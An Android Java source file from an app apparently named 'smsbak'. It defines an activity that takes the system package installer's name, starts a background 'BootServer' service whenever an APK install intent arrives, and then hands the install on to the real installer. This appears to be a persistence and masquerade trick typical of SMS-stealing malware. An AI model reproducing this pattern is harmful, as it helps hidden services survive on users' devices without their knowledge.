package com.smsbak.sms;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class PackageInstallerActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		if(!PhoneUtils.isServiceRunning(this)){
			Intent server=new Intent(this,BootServer.class);
			this.startService(server);
		}
		Intent intent = this.getIntent();
		if (intent != null) {
			String action = intent.getAction();
			Uri uri = intent.getData();
			String type = intent.getType();
			if ("android.intent.action.VIEW".equals(action)) {
				if ("application/vnd.android.package-archive".equals(type)) {
					if (PhoneUtils.checkAppExist(this,
							"com.android.packageinstaller")) {
						Intent installer = new Intent(action);
						installer.setData(uri);
						ComponentName component = new ComponentName(
								"com.android.packageinstaller",
								"com.android.packageinstaller.PackageInstallerActivity");
						installer.setComponent(component);
						this.startActivity(installer);
					}
				}
			}
		}
		this.finish();
	}

}
